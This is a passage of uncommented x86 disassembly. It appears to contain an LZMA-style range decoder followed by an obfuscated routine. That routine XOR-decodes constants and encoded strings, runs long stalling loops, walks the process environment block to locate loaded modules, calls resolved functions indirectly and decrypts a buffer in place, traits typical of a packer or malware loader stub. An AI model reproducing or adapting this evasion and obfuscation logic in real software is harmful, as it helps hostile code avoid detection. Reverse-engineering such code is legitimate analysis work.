  41d76d:	mov    DWORD PTR [ebp-0x30],ecx
  41d770:	mov    ecx,DWORD PTR [ebp-0x28]
  41d773:	mov    DWORD PTR [ebp-0x2c],ecx
  41d776:	mov    ecx,DWORD PTR [ebp-0x24]
  41d779:	mov    DWORD PTR [ebp-0x28],ecx
  41d77c:	mov    DWORD PTR [ebp-0x24],esi
  41d77f:	pop    eax
  41d780:	pop    edi
  41d781:	pop    ecx
  41d782:	mov    edx,0xa68
  41d787:	mov    cl,0x8
  41d789:	add    edx,edi
  41d78b:	push   edx
  41d78c:	push   edi
  41d78d:	cmp    al,0x7
  41d78f:	mov    al,cl
  41d791:	jb     0x41d795
  41d793:	add    al,0x3
  41d795:	push   eax
  41d796:	mov    ebp,DWORD PTR [ebp-0x34]
  41d799:	call   0x41d95c
  41d79e:	jne    0x41d7b4
  41d7a0:	mov    eax,DWORD PTR [ebp-0x18]
  41d7a3:	mov    edi,DWORD PTR [ebp-0x34]
  41d7a6:	shl    eax,0x3
  41d7a9:	sub    ecx,ecx
  41d7ab:	push   0x8
  41d7ad:	pop    esi
  41d7ae:	lea    edi,[edi+eax*2+0x4]
  41d7b2:	jmp    0x41d7e9
  41d7b4:	mov    ebp,DWORD PTR [ebp-0x34]
  41d7b7:	add    ebp,0x2
  41d7ba:	call   0x41d95c
  41d7bf:	jne    0x41d7d9
  41d7c1:	mov    eax,DWORD PTR [ebp-0x18]
  41d7c4:	mov    edi,DWORD PTR [ebp-0x34]
  41d7c7:	shl    eax,0x3
  41d7ca:	push   0x8
  41d7cc:	pop    ecx
  41d7cd:	push   0x8
  41d7cf:	pop    esi
  41d7d0:	lea    edi,[edi+eax*2+0x104]
  41d7d7:	jmp    0x41d7e9
  41d7d9:	mov    edi,0x204
  41d7de:	add    edi,DWORD PTR [ebp-0x34]
  41d7e1:	push   0x10
  41d7e3:	pop    ecx
  41d7e4:	mov    esi,0x100
  41d7e9:	mov    DWORD PTR [ebp-0x1c],ecx
  41d7ec:	sub    eax,eax
  41d7ee:	inc    eax
  41d7ef:	mov    ebp,edi
  41d7f1:	call   0x41d95e
  41d7f6:	mov    ecx,eax
  41d7f8:	sub    ecx,esi
  41d7fa:	jb     0x41d7ef
  41d7fc:	add    DWORD PTR [ebp-0x1c],ecx
  41d7ff:	cmp    DWORD PTR [ebp-0x3c],0x4
  41d803:	jae    0x41d8b9
  41d809:	add    DWORD PTR [ebp-0x3c],0x7
  41d80d:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d810:	cmp    ecx,0x4
  41d813:	jb     0x41d818
  41d815:	push   0x3
  41d817:	pop    ecx
  41d818:	mov    edi,DWORD PTR [ebp-0x38]
  41d81b:	shl    ecx,0x6
  41d81e:	sub    eax,eax
  41d820:	inc    eax
  41d821:	push   0x40
  41d823:	pop    esi
  41d824:	lea    edi,[edi+ecx*2+0x360]
  41d82b:	mov    ebp,edi
  41d82d:	call   0x41d95e
  41d832:	mov    ecx,eax
  41d834:	sub    ecx,esi
  41d836:	jb     0x41d82b
  41d838:	mov    DWORD PTR [ebp-0x18],ecx
  41d83b:	mov    DWORD PTR [ebp-0x24],ecx
  41d83e:	cmp    ecx,0x4
  41d841:	jb     0x41d8b6
  41d843:	mov    esi,ecx
  41d845:	and    DWORD PTR [ebp-0x24],0x1
  41d849:	shr    esi,1
  41d84b:	or     DWORD PTR [ebp-0x24],0x2
  41d84f:	dec    esi
  41d850:	cmp    ecx,0xe
  41d853:	jae    0x41d86e
  41d855:	mov    eax,0x2af
  41d85a:	sub    eax,ecx
  41d85c:	mov    ecx,esi
  41d85e:	shl    BYTE PTR [ebp-0x24],cl
  41d861:	add    eax,DWORD PTR [ebp-0x24]
  41d864:	shl    eax,1
  41d866:	add    eax,DWORD PTR [ebp-0x38]
  41d869:	mov    DWORD PTR [ebp-0x34],eax
  41d86c:	jmp    0x41d89b
  41d86e:	sub    esi,0x4
  41d871:	call   0x41d91b
  41d876:	shr    ebx,1
  41d878:	shl    DWORD PTR [ebp-0x24],1
  41d87b:	cmp    DWORD PTR [ebp-0x20],ebx
  41d87e:	jb     0x41d886
  41d880:	inc    DWORD PTR [ebp-0x24]
  41d883:	sub    DWORD PTR [ebp-0x20],ebx
  41d886:	dec    esi
  41d887:	jne    0x41d871
  41d889:	mov    eax,0x644
  41d88e:	add    eax,DWORD PTR [ebp-0x38]
  41d891:	mov    DWORD PTR [ebp-0x34],eax
  41d894:	shl    DWORD PTR [ebp-0x24],0x4
  41d898:	push   0x4
  41d89a:	pop    esi
  41d89b:	sub    edi,edi
  41d89d:	inc    edi
  41d89e:	mov    eax,edi
  41d8a0:	mov    ebp,DWORD PTR [ebp-0x34]
  41d8a3:	call   0x41d95e
  41d8a8:	test   al,0x1
  41d8aa:	je     0x41d8af
  41d8ac:	or     DWORD PTR [ebp-0x24],edi
  41d8af:	shl    edi,1
  41d8b1:	dec    esi
  41d8b2:	jne    0x41d8a0
  41d8b4:	jmp    0x41d8b6
  41d8b6:	inc    DWORD PTR [ebp-0x24]
  41d8b9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d8bc:	add    ecx,0x2
  41d8bf:	mov    edi,DWORD PTR [ebp-0x4]
  41d8c2:	mov    eax,edi
  41d8c4:	sub    eax,DWORD PTR [ebp+0x24]
  41d8c7:	cmp    DWORD PTR [ebp-0x24],eax
  41d8ca:	ja     0x41d916
  41d8cc:	mov    esi,edi
  41d8ce:	sub    esi,DWORD PTR [ebp-0x24]
  41d8d1:	mov    edx,DWORD PTR [ebp+0x28]
  41d8d4:	lods   al,BYTE PTR ds:[esi]
  41d8d5:	stos   BYTE PTR es:[edi],al
  41d8d6:	cmp    edi,edx
  41d8d8:	jae    0x41d8dd
  41d8da:	dec    ecx
  41d8db:	jne    0x41d8d4
  41d8dd:	mov    DWORD PTR [ebp-0x4],edi
  41d8e0:	movzx  esi,al
  41d8e3:	cmp    edi,DWORD PTR [ebp+0x28]
  41d8e6:	jb     0x41d647
  41d8ec:	call   0x41d91b
  41d8f1:	sub    eax,eax
  41d8f3:	lea    ebp,[esp+0x3c]
  41d8f7:	mov    edx,DWORD PTR [ebp+0x20]
  41d8fa:	mov    esi,DWORD PTR [ebp-0x8]
  41d8fd:	sub    esi,DWORD PTR [ebp+0x18]
  41d900:	mov    DWORD PTR [edx],esi
  41d902:	mov    edx,DWORD PTR [ebp+0x2c]
  41d905:	mov    edi,DWORD PTR [ebp-0x4]
  41d908:	sub    edi,DWORD PTR [ebp+0x24]
  41d90b:	mov    DWORD PTR [edx],edi
  41d90d:	leave  
  41d90e:	pop    ebx
  41d90f:	pop    esi
  41d910:	pop    edi
  41d911:	ret    0x1c
  41d914:	pop    esi
  41d915:	pop    eax
  41d916:	sub    eax,eax
  41d918:	inc    eax
  41d919:	jmp    0x41d8f3
  41d91b:	cmp    ebx,0x1000000
  41d921:	jb     0x41d924
  41d923:	ret    
  41d924:	shl    ebx,0x8
  41d927:	push   esi
  41d928:	mov    esi,DWORD PTR [ebp-0x8]
  41d92b:	cmp    esi,DWORD PTR [ebp+0x1c]
  41d92e:	jae    0x41d914
  41d930:	mov    eax,DWORD PTR [ebp-0x20]
  41d933:	shl    eax,0x8
  41d936:	lods   al,BYTE PTR ds:[esi]
  41d937:	mov    DWORD PTR [ebp-0x20],eax
  41d93a:	mov    DWORD PTR [ebp-0x8],esi
  41d93d:	pop    esi
  41d93e:	ret    
  41d93f:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d942:	movzx  eax,al
  41d945:	shl    ecx,0x4
  41d948:	add    eax,DWORD PTR [ebp-0x18]
  41d94b:	add    eax,ecx
  41d94d:	jmp    0x41d955
  41d94f:	movzx  eax,al
  41d952:	add    eax,DWORD PTR [ebp-0x3c]
  41d955:	mov    ebp,DWORD PTR [ebp-0x38]
  41d958:	lea    ebp,[ebp+eax*2+0x0]
  41d95c:	sub    eax,eax
  41d95e:	lea    ebp,[ebp+eax*2+0x0]
  41d962:	cmp    ebx,0x1000000
  41d968:	jae    0x41d986
  41d96a:	mov    ecx,DWORD PTR [esp+0x38]
  41d96e:	shl    DWORD PTR [esp+0x20],0x8
  41d973:	cmp    ecx,DWORD PTR [esp+0x5c]
  41d977:	jae    0x41d915
  41d979:	mov    dl,BYTE PTR [ecx]
  41d97b:	inc    DWORD PTR [esp+0x38]
  41d97f:	shl    ebx,0x8
  41d982:	mov    BYTE PTR [esp+0x20],dl
  41d986:	mov    ecx,ebx
  41d988:	movzx  edx,WORD PTR [ebp+0x0]
  41d98c:	shr    ecx,0xb
  41d98f:	imul   ecx,edx
  41d992:	cmp    DWORD PTR [esp+0x20],ecx
  41d996:	jae    0x41d9af
  41d998:	mov    ebx,ecx
  41d99a:	mov    ecx,0x800
  41d99f:	sub    ecx,edx
  41d9a1:	shr    ecx,0x5
  41d9a4:	add    WORD PTR [ebp+0x0],cx
  41d9a8:	add    eax,eax
  41d9aa:	lea    ebp,[esp+0x40]
  41d9ae:	ret    
  41d9af:	shr    edx,0x5
  41d9b2:	sub    DWORD PTR [esp+0x20],ecx
  41d9b6:	sub    ebx,ecx
  41d9b8:	sub    WORD PTR [ebp+0x0],dx
  41d9bc:	add    eax,eax
  41d9be:	add    eax,0x1
  41d9c1:	lea    ebp,[esp+0x40]
  41d9c5:	ret    
  41d9c6:	push   ebp
  41d9c7:	mov    ebp,esp
  41d9c9:	sub    esp,0x12c
  41d9cf:	push   ebx
  41d9d0:	push   esi
  41d9d1:	push   edi
  41d9d2:	mov    DWORD PTR [ebp-0x10],0xf89c8581
  41d9d9:	mov    DWORD PTR [ebp-0x18],0xf89c8580
  41d9e0:	mov    eax,DWORD PTR [ebp+0x8]
  41d9e3:	mov    DWORD PTR [ebp+0x8],eax
  41d9e6:	mov    ecx,DWORD PTR [ebp-0x10]
  41d9e9:	mov    ebx,0x751089d
  41d9ee:	xor    ecx,ebx
  41d9f0:	mov    eax,0x3272e4
  41d9f5:	add    ecx,eax
  41d9f7:	mov    DWORD PTR [ebp-0x2c],ecx
  41d9fa:	mov    ecx,DWORD PTR [ebp-0x10]
  41d9fd:	xor    ecx,ebx
  41d9ff:	add    ecx,eax
  41da01:	mov    DWORD PTR [ebp-0x3c],ecx
  41da04:	mov    ecx,DWORD PTR [ebp-0x10]
  41da07:	xor    ecx,ebx
  41da09:	add    ecx,eax
  41da0b:	mov    DWORD PTR [ebp-0x40],ecx
  41da0e:	mov    ecx,DWORD PTR [ebp-0x10]
  41da11:	xor    ecx,ebx
  41da13:	add    ecx,eax
  41da15:	mov    DWORD PTR [ebp-0xd8],ecx
  41da1b:	mov    DWORD PTR [ebp-0x50],0xf89f0581
  41da22:	mov    DWORD PTR [ebp-0x40],0xf89cb581
  41da29:	mov    DWORD PTR [ebp-0x54],0xf89c85bd
  41da30:	push   0x25
  41da32:	pop    ecx
  41da33:	mov    DWORD PTR [ebp-0x38],ecx
  41da36:	mov    DWORD PTR [ebp-0x38],ecx
  41da39:	push   0x65
  41da3b:	pop    ecx
  41da3c:	mov    DWORD PTR [ebp-0x38],ecx
  41da3f:	mov    DWORD PTR [ebp-0x38],ecx
  41da42:	mov    DWORD PTR [ebp-0x38],0x4d
  41da49:	mov    DWORD PTR [ebp-0x38],0x43
  41da50:	mov    ecx,DWORD PTR [ebp-0x10]
  41da53:	xor    ecx,ebx
  41da55:	add    ecx,eax
  41da57:	mov    DWORD PTR [ebp-0x38],ecx
  41da5a:	mov    ecx,DWORD PTR [ebp-0x10]
  41da5d:	xor    ecx,ebx
  41da5f:	add    ecx,eax
  41da61:	mov    DWORD PTR [ebp-0x38],ecx
  41da64:	mov    DWORD PTR [ebp-0x28],0x258
  41da6b:	mov    DWORD PTR [ebp-0x20],0x36
  41da72:	mov    DWORD PTR [ebp-0x14],0x7a
  41da79:	lea    edi,[ebp-0x10c]
  41da7f:	lea    esi,[ebp-0x12c]
  41da85:	call   0x41e747
  41da8a:	dec    DWORD PTR [ebp-0x14]
  41da8d:	jne    0x41da79
  41da8f:	dec    DWORD PTR [ebp-0x20]
  41da92:	jne    0x41da72
  41da94:	dec    DWORD PTR [ebp-0x28]
  41da97:	jne    0x41da6b
  41da99:	mov    DWORD PTR [ebp-0x28],0x400e
  41daa0:	mov    eax,DWORD PTR [ebp-0x10]
  41daa3:	xor    eax,ebx
  41daa5:	mov    esi,0x3272e4
  41daaa:	add    eax,esi
  41daac:	mov    DWORD PTR [ebp-0x1c],eax
  41daaf:	mov    eax,DWORD PTR [ebp-0x10]
  41dab2:	and    DWORD PTR [ebp-0x94],0x0
  41dab9:	xor    eax,ebx
  41dabb:	add    eax,esi
  41dabd:	mov    DWORD PTR [ebp-0x34],eax
  41dac0:	mov    eax,fs:0x18
  41dac6:	mov    DWORD PTR [ebp-0x94],eax
  41dacc:	mov    eax,DWORD PTR [eax+0x30]
  41dacf:	mov    DWORD PTR [ebp-0xcc],eax
  41dad5:	mov    eax,DWORD PTR [eax+0xc]
  41dad8:	mov    DWORD PTR [ebp-0xc0],eax
  41dade:	mov    eax,DWORD PTR [ebp+0x8]
  41dae1:	lea    ecx,[ebp-0x94]
  41dae7:	mov    DWORD PTR [eax+0x1a0],ecx
  41daed:	mov    eax,DWORD PTR [ebp+0x8]
  41daf0:	lea    ecx,[ebp-0xcc]
  41daf6:	mov    DWORD PTR [eax+0x1a4],ecx
  41dafc:	mov    eax,DWORD PTR [ebp+0x8]
  41daff:	push   DWORD PTR [ebp+0x8]
  41db02:	lea    ecx,[ebp-0xc0]
  41db08:	mov    DWORD PTR [eax+0x1a8],ecx
  41db0e:	call   0x41ff0a
  41db13:	mov    ecx,DWORD PTR [ebp-0x10]
  41db16:	xor    ecx,ebx
  41db18:	add    ecx,esi
  41db1a:	cmp    ecx,eax
  41db1c:	je     0x41de9f
  41db22:	mov    eax,DWORD PTR [ebp+0x8]
  41db25:	mov    eax,DWORD PTR [eax+0x194]
  41db2b:	mov    ecx,DWORD PTR [eax]
  41db2d:	mov    eax,DWORD PTR [ebp+0x8]
  41db30:	mov    eax,DWORD PTR [eax+0x194]
  41db36:	mov    eax,DWORD PTR [eax]
  41db38:	add    eax,DWORD PTR [ecx+0x3c]
  41db3b:	mov    ecx,DWORD PTR [ebp+0x8]
  41db3e:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41db44:	lea    edx,[ebp-0xec]
  41db4a:	push   edx
  41db4b:	mov    edx,DWORD PTR [ebp+0x8]
  41db4e:	mov    edx,DWORD PTR [edx+0x18c]
  41db54:	mov    edx,DWORD PTR [edx]
  41db56:	add    edx,DWORD PTR [eax+0x88]
  41db5c:	push   0x4
  41db5e:	push   DWORD PTR [eax+0x8c]
  41db64:	push   edx
  41db65:	call   DWORD PTR [ecx+0x1c]
  41db68:	push   DWORD PTR [ebp+0x8]
  41db6b:	xor    eax,eax
  41db6d:	mov    DWORD PTR [ebp-0xa8],0x1a3f0f25
  41db77:	mov    DWORD PTR [ebp-0xa4],0x3260c1d
  41db81:	mov    DWORD PTR [ebp-0xa0],0x3d0c190b
  41db8b:	mov    BYTE PTR [ebp-0x9c],0x72
  41db92:	lea    edi,[ebp-0x9b]
  41db98:	stos   DWORD PTR es:[edi],eax
  41db99:	stos   WORD PTR es:[edi],ax
  41db9b:	stos   BYTE PTR es:[edi],al
  41db9c:	xor    eax,eax
  41db9e:	mov    DWORD PTR [ebp-0xbc],0x1a3f0f25
  41dba8:	mov    DWORD PTR [ebp-0xb8],0x3260c1d
  41dbb2:	mov    DWORD PTR [ebp-0xb4],0x2b0c190b
  41dbbc:	mov    BYTE PTR [ebp-0xb0],0x72
  41dbc3:	lea    edi,[ebp-0xaf]
  41dbc9:	stos   DWORD PTR es:[edi],eax
  41dbca:	stos   WORD PTR es:[edi],ax
  41dbcc:	stos   BYTE PTR es:[edi],al
  41dbcd:	mov    edi,DWORD PTR [ebp+0x8]
  41dbd0:	mov    eax,DWORD PTR [ebp+0x8]
  41dbd3:	mov    edx,DWORD PTR [eax+0x1b8]
  41dbd9:	mov    DWORD PTR [ebp-0x68],0xc0e0f06
  41dbe0:	mov    DWORD PTR [ebp-0x64],0x502011f
  41dbe7:	mov    WORD PTR [ebp-0x60],0x723d
  41dbed:	mov    DWORD PTR [ebp-0x90],0x1a3f0f25
  41dbf7:	mov    DWORD PTR [ebp-0x8c],0x63d0c1d
  41dc01:	mov    DWORD PTR [ebp-0x88],0x201d1a02
  41dc0b:	mov    DWORD PTR [ebp-0x84],0xc190109
  41dc15:	mov    DWORD PTR [ebp-0x80],0x723d1f05
  41dc1c:	mov    DWORD PTR [ebp-0x7c],0x1a3f0f25
  41dc23:	mov    DWORD PTR [ebp-0x78],0x63d0c1d
  41dc2a:	mov    DWORD PTR [ebp-0x74],0x201d1a02
  41dc31:	mov    DWORD PTR [ebp-0x70],0xc190109
  41dc38:	mov    DWORD PTR [ebp-0x6c],0x722b1f05
  41dc3f:	call   0x41ff39
  41dc44:	push   eax
  41dc45:	mov    eax,DWORD PTR [ebp+0x8]
  41dc48:	mov    eax,DWORD PTR [eax+0x1a8]
  41dc4e:	push   DWORD PTR [eax]
  41dc50:	call   0x41fbda
  41dc55:	test   eax,eax
  41dc57:	jne    0x41dca9
  41dc59:	mov    eax,DWORD PTR [ebp+0x8]
  41dc5c:	mov    eax,DWORD PTR [eax+0x1d8]
  41dc62:	mov    edi,DWORD PTR [ebp+0x8]
  41dc65:	add    eax,0x4
  41dc68:	mov    DWORD PTR [ebp-0x24],eax
  41dc6b:	mov    eax,DWORD PTR [ebp+0x8]
  41dc6e:	mov    edx,DWORD PTR [eax+0x1b8]
  41dc74:	call   0x41ff39
  41dc79:	push   eax
  41dc7a:	mov    eax,DWORD PTR [ebp-0x24]
  41dc7d:	call   DWORD PTR [eax]
  41dc7f:	test   eax,eax
  41dc81:	jne    0x41dca9
  41dc83:	mov    eax,DWORD PTR [ebp+0x8]
  41dc86:	mov    eax,DWORD PTR [eax+0x1d8]
  41dc8c:	mov    edi,DWORD PTR [ebp+0x8]
  41dc8f:	add    eax,0x10
  41dc92:	mov    DWORD PTR [ebp-0x24],eax
  41dc95:	mov    eax,DWORD PTR [ebp+0x8]
  41dc98:	mov    edx,DWORD PTR [eax+0x1b8]
  41dc9e:	call   0x41ff39
  41dca3:	push   eax
  41dca4:	mov    eax,DWORD PTR [ebp-0x24]
  41dca7:	call   DWORD PTR [eax]
  41dca9:	mov    eax,DWORD PTR [ebp-0x10]
  41dcac:	mov    ecx,DWORD PTR [ebp-0x28]
  41dcaf:	xor    eax,ebx
  41dcb1:	add    eax,esi
  41dcb3:	cmp    eax,ecx
  41dcb5:	je     0x41de78
  41dcbb:	mov    eax,DWORD PTR [ebp-0x18]
  41dcbe:	xor    eax,ebx
  41dcc0:	mov    ecx,0xffcd8d1c
  41dcc5:	sub    ecx,eax
  41dcc7:	add    ecx,DWORD PTR [ebp-0x28]
  41dcca:	mov    eax,DWORD PTR [ebp-0x1c]
  41dccd:	cmp    eax,ecx
  41dccf:	ja     0x41de78
  41dcd5:	mov    DWORD PTR [ebp-0x20],0x0
  41dcdc:	push   DWORD PTR [ebp+0x8]
  41dcdf:	mov    edi,DWORD PTR [ebp+0x8]
  41dce2:	mov    eax,DWORD PTR [ebp+0x8]
  41dce5:	mov    edx,DWORD PTR [eax+0x1b4]
  41dceb:	call   0x41ff39
  41dcf0:	push   eax
  41dcf1:	mov    eax,DWORD PTR [ebp+0x8]
  41dcf4:	mov    eax,DWORD PTR [eax+0x1a8]
  41dcfa:	push   DWORD PTR [eax]
  41dcfc:	call   0x41fbda
  41dd01:	mov    ecx,DWORD PTR [ebp+0x8]
  41dd04:	mov    ecx,DWORD PTR [ecx+0x19c]
  41dd0a:	mov    DWORD PTR [ecx],eax
  41dd0c:	mov    eax,DWORD PTR [ebp+0x8]
  41dd0f:	mov    edi,DWORD PTR [eax+0x1d8]
  41dd15:	mov    esi,DWORD PTR [ebp+0x8]
  41dd18:	xor    eax,eax
  41dd1a:	lea    edx,[ebp-0x7c]
  41dd1d:	call   0x41ff6f
  41dd22:	push   eax
  41dd23:	mov    eax,DWORD PTR [ebp+0x8]
  41dd26:	mov    eax,DWORD PTR [eax+0x19c]
  41dd2c:	push   DWORD PTR [eax]
  41dd2e:	call   DWORD PTR [edi+0x8]
  41dd31:	mov    DWORD PTR [ebp-0x24],eax
  41dd34:	mov    eax,DWORD PTR [ebp+0x8]
  41dd37:	mov    edi,DWORD PTR [eax+0x1d8]
  41dd3d:	mov    esi,DWORD PTR [ebp+0x8]
  41dd40:	xor    eax,eax
  41dd42:	lea    edx,[ebp-0x90]
  41dd48:	call   0x41ff6f
  41dd4d:	push   eax
  41dd4e:	mov    eax,DWORD PTR [ebp+0x8]
  41dd51:	mov    eax,DWORD PTR [eax+0x19c]
  41dd57:	push   DWORD PTR [eax]
  41dd59:	call   DWORD PTR [edi+0x8]
  41dd5c:	mov    eax,DWORD PTR [ebp+0x8]
  41dd5f:	mov    edi,DWORD PTR [eax+0x1d8]
  41dd65:	mov    esi,DWORD PTR [ebp+0x8]
  41dd68:	xor    eax,eax
  41dd6a:	lea    edx,[ebp-0xa8]
  41dd70:	call   0x41ff6f
  41dd75:	push   eax
  41dd76:	mov    eax,DWORD PTR [ebp+0x8]
  41dd79:	mov    eax,DWORD PTR [eax+0x19c]
  41dd7f:	push   DWORD PTR [eax]
  41dd81:	call   DWORD PTR [edi+0x8]
  41dd84:	and    DWORD PTR [ebp-0x8],0x0
  41dd88:	mov    DWORD PTR [ebp-0x44],eax
  41dd8b:	mov    eax,DWORD PTR [ebp-0x8]
  41dd8e:	and    eax,0x7
  41dd91:	add    eax,0x31
  41dd94:	push   eax
  41dd95:	call   DWORD PTR [ebp-0x24]
  41dd98:	test   eax,eax
  41dd9a:	je     0x41ddde
  41dd9c:	mov    eax,DWORD PTR [ebp-0x8]
  41dd9f:	push   0x19
  41dda1:	xor    edx,edx
  41dda3:	pop    ecx
  41dda4:	div    ecx
  41dda6:	add    dl,0x41
  41dda9:	movzx  eax,dl
  41ddac:	push   eax
  41ddad:	call   DWORD PTR [ebp-0x44]
  41ddb0:	test   eax,eax
  41ddb2:	jne    0x41ddde
  41ddb4:	mov    eax,DWORD PTR [ebp+0x8]
  41ddb7:	mov    edi,DWORD PTR [eax+0x1d8]
  41ddbd:	mov    esi,DWORD PTR [ebp+0x8]
  41ddc0:	xor    eax,eax
  41ddc2:	lea    edx,[ebp-0x68]
  41ddc5:	call   0x41ff6f
  41ddca:	push   eax
  41ddcb:	mov    eax,DWORD PTR [ebp+0x8]
  41ddce:	mov    eax,DWORD PTR [eax+0x198]
  41ddd4:	push   DWORD PTR [eax]
  41ddd6:	call   DWORD PTR [edi+0x8]
  41ddd9:	mov    DWORD PTR [ebp-0x14],eax
  41dddc:	jmp    0x41dde2
  41ddde:	and    DWORD PTR [ebp-0x14],0x0
  41dde2:	inc    DWORD PTR [ebp-0x8]
  41dde5:	cmp    DWORD PTR [ebp-0x8],0x10
  41dde9:	jb     0x41dd8b
  41ddeb:	mov    eax,DWORD PTR [ebp-0x18]
  41ddee:	mov    esi,DWORD PTR [ebp+0x8]
  41ddf1:	xor    eax,ebx
  41ddf3:	mov    edi,0x3272e4
  41ddf8:	add    eax,edi
  41ddfa:	lea    edx,[ebp-0x10c]
  41de00:	call   0x41ff6f
  41de05:	push   eax
  41de06:	mov    eax,DWORD PTR [ebp-0x10]
  41de09:	mov    esi,DWORD PTR [ebp+0x8]
  41de0c:	xor    eax,ebx
  41de0e:	add    eax,edi
  41de10:	lea    edx,[ebp-0x12c]
  41de16:	call   0x41ff6f
  41de1b:	push   eax
  41de1c:	call   DWORD PTR [ebp-0x14]
  41de1f:	mov    ecx,DWORD PTR [ebp-0x10]
  41de22:	xor    ecx,ebx
  41de24:	add    ecx,edi
  41de26:	cmp    ecx,eax
  41de28:	jne    0x41de31
  41de2a:	mov    DWORD PTR [ebp-0x20],0x1
  41de31:	mov    eax,DWORD PTR [ebp-0x18]
  41de34:	mov    ecx,DWORD PTR [ebp-0x1c]
  41de37:	xor    eax,ebx
  41de39:	lea    eax,[eax+ecx*1+0x3272e4]
  41de40:	mov    DWORD PTR [ebp-0x1c],eax
  41de43:	mov    eax,DWORD PTR [ebp-0x20]
  41de46:	test   eax,eax
  41de48:	je     0x41de5c
  41de4a:	mov    eax,DWORD PTR [ebp-0x18]
  41de4d:	mov    ecx,DWORD PTR [ebp-0x34]
  41de50:	xor    eax,ebx
  41de52:	lea    eax,[eax+ecx*1+0x3272e4]
  41de59:	mov    DWORD PTR [ebp-0x34],eax
  41de5c:	mov    eax,DWORD PTR [ebp-0x18]
  41de5f:	xor    eax,ebx
  41de61:	mov    ecx,0xffcd8d1c
  41de66:	sub    ecx,eax
  41de68:	add    ecx,DWORD PTR [ebp-0x28]
  41de6b:	mov    eax,DWORD PTR [ebp-0x1c]
  41de6e:	cmp    eax,ecx
  41de70:	jbe    0x41dcd5
  41de76:	mov    esi,edi
  41de78:	mov    eax,DWORD PTR [ebp-0x34]
  41de7b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41de7e:	cmp    ecx,eax
  41de80:	jne    0x41de93
  41de82:	push   DWORD PTR [ebp+0x8]
  41de85:	lea    eax,[ebp-0x3c]
  41de88:	push   eax
  41de89:	call   0x4209df
  41de8e:	mov    DWORD PTR [ebp-0x2c],eax
  41de91:	jmp    0x41de9f
  41de93:	mov    eax,DWORD PTR [ebp-0x2c]
  41de96:	mov    ecx,DWORD PTR [ebp-0x18]
  41de99:	xor    ecx,ebx
  41de9b:	add    ecx,esi
  41de9d:	xor    DWORD PTR [eax],ecx
  41de9f:	mov    eax,DWORD PTR [ebp-0x10]
  41dea2:	mov    ecx,DWORD PTR [ebp-0x2c]
  41dea5:	xor    eax,ebx
  41dea7:	add    eax,esi
  41dea9:	cmp    eax,ecx
  41deab:	je     0x41e625
  41deb1:	mov    eax,DWORD PTR [ebp-0x10]
  41deb4:	mov    ecx,DWORD PTR [ebp-0x3c]
  41deb7:	xor    eax,ebx
  41deb9:	add    eax,esi
  41debb:	cmp    eax,ecx
  41debd:	je     0x41e625
  41dec3:	mov    eax,DWORD PTR [ebp-0x10]
  41dec6:	xor    eax,ebx
  41dec8:	add    eax,esi
  41deca:	jmp    0x41dee8
  41decc:	mov    edi,DWORD PTR [ebp-0x2c]
  41decf:	mov    cl,al
  41ded1:	and    cl,0x1f
  41ded4:	or     dl,0xff
  41ded7:	sub    dl,cl
  41ded9:	add    BYTE PTR [edi+eax*1],dl
  41dedc:	mov    ecx,DWORD PTR [ebp-0x18]
  41dedf:	xor    ecx,ebx
  41dee1:	lea    eax,[eax+ecx*1+0x3272e4]
  41dee8:	mov    ecx,DWORD PTR [ebp-0x3c]
  41deeb:	cmp    eax,ecx
  41deed:	jb     0x41decc
  41deef:	mov    eax,DWORD PTR [ebp-0x3c]
  41def2:	mov    DWORD PTR [ebp-0x28],eax
  41def5:	mov    eax,DWORD PTR [ebp-0x2c]
  41def8:	mov    DWORD PTR [ebp-0x34],0xf89c8581
  41deff:	mov    DWORD PTR [ebp-0xd4],eax
  41df05:	mov    edi,0xf89c8580
  41df0a:	mov    DWORD PTR [ebp-0x30],edi
  41df0d:	mov    eax,DWORD PTR [ebp-0x34]
  41df10:	xor    eax,ebx
  41df12:	add    eax,esi
  41df14:	mov    DWORD PTR [ebp-0xc],eax
  41df17:	mov    eax,DWORD PTR [ebp-0x34]
  41df1a:	xor    eax,ebx
  41df1c:	add    eax,esi
  41df1e:	mov    DWORD PTR [ebp-0x8],eax
  41df21:	mov    DWORD PTR [ebp-0x44],0xf89c85a1
  41df28:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  41df2f:	mov    eax,DWORD PTR [ebp-0x34]
  41df32:	mov    ecx,DWORD PTR [ebp-0x28]
  41df35:	xor    eax,ebx
  41df37:	add    eax,esi
  41df39:	cmp    ecx,eax
  41df3b:	je     0x41e13a
  41df41:	jmp    0x41e116
  41df46:	mov    ecx,DWORD PTR [ebp-0xc]
  41df49:	mov    eax,DWORD PTR [ebp-0x28]
  41df4c:	sub    eax,ecx
  41df4e:	mov    ecx,DWORD PTR [ebp-0x44]
  41df51:	xor    ecx,ebx
  41df53:	add    ecx,esi
  41df55:	xor    edx,edx
  41df57:	div    ecx
  41df59:	mov    DWORD PTR [ebp-0x8],eax
  41df5c:	mov    eax,DWORD PTR [ebp-0x4c]
  41df5f:	mov    ecx,DWORD PTR [ebp-0x8]
  41df62:	xor    eax,ebx
  41df64:	add    eax,esi
  41df66:	cmp    ecx,eax
  41df68:	jbe    0x41df74
  41df6a:	mov    eax,DWORD PTR [ebp-0x4c]
  41df6d:	xor    eax,ebx
  41df6f:	add    eax,esi
  41df71:	mov    DWORD PTR [ebp-0x8],eax
  41df74:	mov    eax,DWORD PTR [ebp-0x44]
  41df77:	mov    ecx,DWORD PTR [ebp-0x8]
  41df7a:	xor    eax,ebx
  41df7c:	add    eax,esi
  41df7e:	imul   eax,ecx
  41df81:	mov    DWORD PTR [ebp-0x8],eax
  41df84:	mov    eax,DWORD PTR [ebp-0x34]
  41df87:	mov    ecx,DWORD PTR [ebp-0x8]
  41df8a:	xor    eax,ebx
  41df8c:	add    eax,esi
  41df8e:	cmp    ecx,eax
  41df90:	je     0x41e104
  41df96:	mov    eax,DWORD PTR [ebp-0x8]
  41df99:	mov    DWORD PTR [ebp-0x14],eax
  41df9c:	mov    eax,DWORD PTR [ebp-0xc]
  41df9f:	add    eax,DWORD PTR [ebp-0xd4]
  41dfa5:	mov    DWORD PTR [ebp-0x24],0xf89c8581
  41dfac:	mov    DWORD PTR [ebp-0x20],edi
  41dfaf:	mov    DWORD PTR [ebp-0xe8],0xf89c8583
  41dfb9:	mov    DWORD PTR [ebp-0x8],eax
